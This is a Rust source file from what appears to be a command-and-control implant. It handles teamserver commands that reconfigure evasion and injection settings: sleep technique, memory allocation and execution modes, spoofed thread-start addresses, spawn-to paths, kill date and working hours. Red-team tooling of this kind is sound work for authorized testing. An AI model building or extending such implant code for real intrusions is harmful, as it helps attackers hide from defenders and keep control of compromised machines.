//! Runtime configuration update handlers.

use red_cell_common::demon::DemonCommand;
use red_cell_common::demon::DemonConfigKey;
use tracing::{info, warn};

use super::{
    DispatchResult, Response, decode_utf16le_null, parse_bytes_le, parse_u32_le, parse_u64_le,
    write_bytes_le, write_ptr_le, write_u32_le, write_utf16le,
};
use crate::config::SpecterConfig;

// ─── COMMAND_CONFIG (2500) ───────────────────────────────────────────────────

/// Handle a `CommandConfig` task: update a runtime configuration value and echo
/// the new setting back to the teamserver.
///
/// Incoming payload (LE): `[config_key: u32][key-specific value(s)…]`
/// Outgoing payload (LE): `[config_key: u32][key-specific echo value(s)…]`
pub(super) fn handle_config(payload: &[u8], config: &mut SpecterConfig) -> DispatchResult {
    let mut offset = 0;

    let key_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandConfig: failed to parse config key: {e}");
            return DispatchResult::Ignore;
        }
    };

    let key = match DemonConfigKey::try_from(key_raw) {
        Ok(k) => k,
        Err(_) => {
            warn!(key = key_raw, "CommandConfig: unknown config key — ignoring");
            return DispatchResult::Ignore;
        }
    };

    let rest = &payload[offset..];
    match key {
        DemonConfigKey::ImplantVerbose => handle_config_u32_bool(key_raw, rest, config, |c, v| {
            c.verbose = v != 0;
        }),
        DemonConfigKey::ImplantSleepTechnique => {
            handle_config_u32(key_raw, rest, config, |c, v| c.sleep_technique = v)
        }
        DemonConfigKey::ImplantCoffeeThreaded => {
            handle_config_u32_bool(key_raw, rest, config, |c, v| c.coffee_threaded = v != 0)
        }
        DemonConfigKey::ImplantCoffeeVeh => {
            handle_config_u32_bool(key_raw, rest, config, |c, v| c.coffee_veh = v != 0)
        }
        DemonConfigKey::MemoryAlloc => {
            handle_config_u32(key_raw, rest, config, |c, v| c.memory_alloc = v)
        }
        DemonConfigKey::MemoryExecute => {
            handle_config_u32(key_raw, rest, config, |c, v| c.memory_execute = v)
        }
        DemonConfigKey::InjectTechnique => {
            handle_config_u32(key_raw, rest, config, |c, v| c.inject_technique = v)
        }
        DemonConfigKey::ImplantSpfThreadStart => {
            handle_config_addr(key_raw, rest, config, |c, lib, func, off| {
                c.spf_thread_addr = Some((lib, func, off));
            })
        }
        DemonConfigKey::InjectSpoofAddr => {
            handle_config_addr(key_raw, rest, config, |c, lib, func, off| {
                c.inject_spoof_addr = Some((lib, func, off));
            })
        }
        DemonConfigKey::InjectSpawn64 => {
            handle_config_spawn(key_raw, rest, config, |c, path| c.spawn64 = Some(path))
        }
        DemonConfigKey::InjectSpawn32 => {
            handle_config_spawn(key_raw, rest, config, |c, path| c.spawn32 = Some(path))
        }
        DemonConfigKey::KillDate => handle_config_killdate(key_raw, rest, config),
        DemonConfigKey::WorkingHours => {
            handle_config_u32(key_raw, rest, config, |c, v| c.working_hours = Some(v as i32))
        }
    }
}

/// Config sub-handler for simple `u32` values: read value, apply setter, echo back.
fn handle_config_u32(
    key_raw: u32,
    rest: &[u8],
    config: &mut SpecterConfig,
    setter: impl FnOnce(&mut SpecterConfig, u32),
) -> DispatchResult {
    let mut offset = 0;
    let value = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandConfig: failed to parse u32 value: {e}");
            return DispatchResult::Ignore;
        }
    };
    setter(config, value);

    let mut out = Vec::with_capacity(8);
    write_u32_le(&mut out, key_raw);
    write_u32_le(&mut out, value);
    DispatchResult::Respond(Response::new(DemonCommand::CommandConfig, out))
}

/// Config sub-handler for boolean-as-u32 values (same wire format as `handle_config_u32`).
fn handle_config_u32_bool(
    key_raw: u32,
    rest: &[u8],
    config: &mut SpecterConfig,
    setter: impl FnOnce(&mut SpecterConfig, u32),
) -> DispatchResult {
    handle_config_u32(key_raw, rest, config, setter)
}

/// Config sub-handler for address triplets: `[library: string][function: string][offset: u32]`.
///
/// Echoes back `[config_key][library: string][function: string]`.
fn handle_config_addr(
    key_raw: u32,
    rest: &[u8],
    config: &mut SpecterConfig,
    setter: impl FnOnce(&mut SpecterConfig, String, String, u32),
) -> DispatchResult {
    let mut offset = 0;
    let lib_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandConfig: failed to parse addr library: {e}");
            return DispatchResult::Ignore;
        }
    };
    let func_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandConfig: failed to parse addr function: {e}");
            return DispatchResult::Ignore;
        }
    };
    let off = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandConfig: failed to parse addr offset: {e}");
            return DispatchResult::Ignore;
        }
    };

    let library = String::from_utf8_lossy(&lib_bytes).trim_end_matches('\0').to_string();
    let function = String::from_utf8_lossy(&func_bytes).trim_end_matches('\0').to_string();

    info!(library = %library, function = %function, offset = off, "config addr updated");
    setter(config, library.clone(), function.clone(), off);

    // Echo back: [key][library string][function string]
    let mut out = Vec::new();
    write_u32_le(&mut out, key_raw);
    write_string_le(&mut out, &library);
    write_string_le(&mut out, &function);
    DispatchResult::Respond(Response::new(DemonCommand::CommandConfig, out))
}

/// Config sub-handler for spawn process paths (UTF-16LE encoded from the server).
///
/// Echoes back `[config_key][path: utf16le]`.
fn handle_config_spawn(
    key_raw: u32,
    rest: &[u8],
    config: &mut SpecterConfig,
    setter: impl FnOnce(&mut SpecterConfig, String),
) -> DispatchResult {
    let mut offset = 0;
    let raw_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandConfig: failed to parse spawn path: {e}");
            return DispatchResult::Ignore;
        }
    };

    let path = decode_utf16le_null(&raw_bytes);
    info!(path = %path, "config spawn path updated");
    setter(config, path.clone());

    // Echo back: [key][path as utf16le]
    let mut out = Vec::new();
    write_u32_le(&mut out, key_raw);
    write_utf16le(&mut out, &path);
    DispatchResult::Respond(Response::new(DemonCommand::CommandConfig, out))
}

/// Config sub-handler for kill date (`i64` Unix timestamp).
///
/// Echoes back `[config_key][timestamp: u64]`.
fn handle_config_killdate(key_raw: u32, rest: &[u8], config: &mut SpecterConfig) -> DispatchResult {
    let mut offset = 0;
    let raw = match parse_u64_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandConfig: failed to parse kill date: {e}");
            return DispatchResult::Ignore;
        }
    };

    config.kill_date = if raw == 0 { None } else { Some(raw as i64) };
    info!(kill_date = ?config.kill_date, "config kill date updated");

    let mut out = Vec::with_capacity(12);
    write_u32_le(&mut out, key_raw);
    write_ptr_le(&mut out, raw);
    DispatchResult::Respond(Response::new(DemonCommand::CommandConfig, out))
}

/// Append a NUL-terminated UTF-8 string as `[u32 LE length][bytes + NUL]`.
pub(super) fn write_string_le(buf: &mut Vec<u8>, s: &str) {
    let mut data = Vec::with_capacity(s.len() + 1);
    data.extend_from_slice(s.as_bytes());
    data.push(0);
    write_bytes_le(buf, &data);
}
